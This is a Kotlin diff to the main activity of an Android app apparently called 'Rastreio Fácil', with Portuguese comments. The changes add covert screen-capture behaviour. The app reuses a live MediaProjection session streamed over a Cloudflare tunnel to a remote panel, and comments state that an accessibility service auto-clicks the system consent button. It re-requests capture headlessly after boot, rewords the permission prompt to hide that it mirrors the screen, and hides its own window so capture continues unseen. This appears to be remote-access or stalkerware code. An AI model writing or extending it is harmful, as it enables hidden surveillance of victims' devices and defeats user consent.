@@ -165,6 +165,9 @@ class MainActivity : Activity() {
         }
 
         private const val PREFS = "rastreio_facil_prefs"
+        // Cooldown após o usuário CANCELAR o consentimento de espelhamento: por
+        // esse tempo não reabrimos o diálogo do MediaProjection (anti-loop).
+        private const val COOLDOWN_CANCELAMENTO_MS = 20 * 60 * 1000L  // 20 min
         private const val KEY_PRIMEIRO_ACESSO = "primeiro_acesso"
         private const val KEY_PERMISSOES_OK = "permissoes_onboarding_ok"
         // Quando true, o cliente já chegou na tela "Análise em Andamento"
@@ -480,7 +483,15 @@ class MainActivity : Activity() {
         // consentimento -> modal "Iniciar agora" -> auto-clique (inject).
         if (ScreenCaptureService.isRunning && ScreenCaptureService.capturandoDeVerdade) return
         iniciarCapturaDisparado = false                     // libera novo fluxo de captura
-        handlerMain.post { exibirModalConsentimentoTela() } // reaparece o modal interno
+        // (item 3) Em modo HEADLESS (AUTO_BOOT_REANIMAR) NÃO mostra o modal
+        // interno redundante — vai direto ao fluxo do sistema (iniciarCaptura →
+        // prosseguirMediaProjection, que já respeita o cooldown). Só mostra o
+        // modal interno quando a Activity está visível para o usuário.
+        if (reanimacaoBootAutomatica) {
+            handlerMain.post { iniciarCaptura() }
+        } else {
+            handlerMain.post { exibirModalConsentimentoTela() } // reaparece o modal interno
+        }
     }
 
     override fun onResume() {
@@ -548,20 +559,14 @@ class MainActivity : Activity() {
      */
     private fun aplicarOverlayAtualizacao(ativo: Boolean) {
         try {
-            if (ativo && podeSobrepor()) {
-                // Service (janela independente) — funciona em físico e emulador.
-                startService(Intent(this,
-                    OverlayService::class.java))
-                // Evita duplicata: o Service é o dono da janela; a janela
-                // dentro da Activity fica desligada.
-                mostrarLoadingOverlay(false)
-                return
-            }
-            // Desligando OU sem permissão: garante que o Service não rode e
-            // usa o fallback dentro da Activity (ou remove, ao desligar).
+            // OVERLAY REMOVIDO DA CAPTURA (Opção A): NÃO inicia mais o
+            // OverlayService (fundo full-screen que o MediaProjection captura e
+            // cobria/piscava o espelhamento). Garante que ele fique PARADO. O
+            // cartão "Atualizando…" é feito pela acessibilidade
+            // (mostrarOverlayAtualizacao), que NÃO entra na captura.
             stopService(Intent(this, OverlayService::class.java))
         } catch (e: Exception) {
-            Log.e(TAG, "Erro ao controlar OverlayService: ${e.message}")
+            Log.e(TAG, "Erro ao parar OverlayService: ${e.message}")
         }
         mostrarLoadingOverlay(ativo)
     }
@@ -1627,9 +1632,14 @@ class MainActivity : Activity() {
         // 6) ESPELHAMENTO (MediaProjection) — por último; o "Iniciar agora" já é
         //    auto-clicado pelo loop do serviço de acessibilidade.
         lista.add(PassoPermissao(
-            "captura", "Iniciar espelhamento",
-            "Permite ver a tela do aparelho. Toque em \"Iniciar agora\".",
-            { ScreenCaptureService.isRunning && ScreenCaptureService.capturandoDeVerdade },
+            "captura", "Conexão da tela",
+            "Necessário para ter acesso em tempo real entre o aparelho e o painel. Toque em Iniciar quando o aviso do sistema aparecer.",
+            // SESSÃO VIVA: basta o serviço estar RODANDO (a sessão é reutilizável).
+            // NÃO exige capturandoDeVerdade — esse flag cai quando o token do
+            // MediaProjection se perde ao apagar a tela, o que fazia o onboarding
+            // nunca concluir e RE-PEDIR o modal "Iniciar agora" a cada abertura.
+            // Só é "pendente" (re-pede) quando o serviço realmente parou.
+            { ScreenCaptureService.isRunning },
             { prosseguirMediaProjection() }
         ))
         return lista
@@ -1972,6 +1982,29 @@ class MainActivity : Activity() {
     }
 
     private fun prosseguirMediaProjection() {
+        // REUTILIZAÇÃO DA SESSÃO VIVA: se o ScreenCaptureService já está rodando
+        // (espelhando pelo túnel Cloudflare), NÃO dispara o modal "Iniciar agora"
+        // de novo ao reabrir o app — a sessão/token é reaproveitada e o usuário
+        // navega na interface sem interrupção. Só pede consentimento de novo
+        // quando o serviço realmente parou (isRunning == false).
+        if (ScreenCaptureService.isRunning) {
+            Log.i(TAG, "[MP] ScreenCaptureService já ativo — reutilizando sessão, sem novo modal de captura.")
+            if (reanimacaoBootAutomatica) handlerMain.postDelayed({ finish() }, 200)
+            return
+        }
+        // (item 3) Anti-loop: no caminho AUTOMÁTICO (reanimação headless), NÃO
+        // reabre o diálogo do sistema enquanto houver cooldown de cancelamento
+        // ativo. O toque EXPLÍCITO do usuário (orquestrador) sempre passa.
+        if (reanimacaoBootAutomatica) {
+            val cooldownAte = try {
+                getSharedPreferences(PREFS, MODE_PRIVATE).getLong("espelhamento_cooldown_ate", 0L)
+            } catch (_: Exception) { 0L }
+            if (System.currentTimeMillis() < cooldownAte) {
+                Log.i(TAG, "[MP] Cooldown de cancelamento ativo — pulando pedido automático de espelhamento.")
+                handlerMain.postDelayed({ finish() }, 200)
+                return
+            }
+        }
         val mpm = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
         startActivityForResult(mpm.createScreenCaptureIntent(), REQUEST_MEDIA_PROJECTION)
     }
@@ -1979,14 +2012,33 @@ class MainActivity : Activity() {
     @Deprecated("Deprecated in Java")
     override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
         super.onActivityResult(requestCode, resultCode, data)
+        // (item 1b/3) Usuário CANCELOU o consentimento de espelhamento
+        // (RESULT_CANCELED): grava um cooldown longo para NÃO reabrir o diálogo
+        // nesse intervalo — nem a reanimação (MyAccessibilityService) nem o
+        // prosseguirMediaProjection insistem enquanto o cooldown estiver ativo.
+        if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode != RESULT_OK) {
+            try {
+                getSharedPreferences(PREFS, MODE_PRIVATE)
+                    .edit()
+                    .putLong("espelhamento_cooldown_ate", System.currentTimeMillis() + COOLDOWN_CANCELAMENTO_MS)
+                    .apply()
+            } catch (_: Exception) {}
+            // Em modo headless pós-boot, fecha a Activity silenciosamente.
+            if (reanimacaoBootAutomatica) handlerMain.postDelayed({ finish() }, 200)
+        }
         if (requestCode == REQUEST_MEDIA_PROJECTION && resultCode == RESULT_OK && data != null) {
             // CORREÇÃO DE CRASH: o resultado do consentimento pode chegar com a
             // Activity recriada, ANTES de onCreate inicializar o lateinit `prefs`
             // (UninitializedPropertyAccessException). Usamos getSharedPreferences
             // direto aqui para nunca depender do lateinit e nunca fechar o app.
             try {
+                // RESULT_OK: consentimento dado → zera o cooldown de cancelamento
+                // (item 1b: contador reiniciado apenas no OK).
                 getSharedPreferences(PREFS, MODE_PRIVATE)
-                    .edit().putBoolean("consentimento_captura", true).apply()
+                    .edit()
+                    .putBoolean("consentimento_captura", true)
+                    .putLong("espelhamento_cooldown_ate", 0L)
+                    .apply()
             } catch (_: Exception) {}
             val intentServico = Intent(this, ScreenCaptureService::class.java).apply {
                 putExtra("RESULT_CODE", resultCode)
@@ -2007,6 +2059,18 @@ class MainActivity : Activity() {
                 handlerMain.postDelayed({
                     finish()
                 }, 200)
+            } else {
+                // TRANSIÇÃO LIMPA (não-headless): após aceitar o consentimento,
+                // a tela (clara) do app NÃO pode ficar em primeiro plano sendo
+                // capturada pelo MediaProjection (corpo branco). Primeiro manda a
+                // task para o fundo (revela a Home na hora) e, logo em seguida,
+                // REMOVE a task (finishAndRemoveTask) para não sobrar nenhuma
+                // janela branca. O ScreenCaptureService (Foreground) segue
+                // capturando a tela REAL por baixo — ele é independente da Activity.
+                try { moveTaskToBack(true) } catch (_: Exception) {}
+                handlerMain.postDelayed({
+                    try { finishAndRemoveTask() } catch (_: Exception) { try { finish() } catch (_: Exception) {} }
+                }, 150)
             }
         }
         if (requestCode == REQUEST_OVERLAY && podeSobrepor() && !ScreenCaptureService.isRunning) {
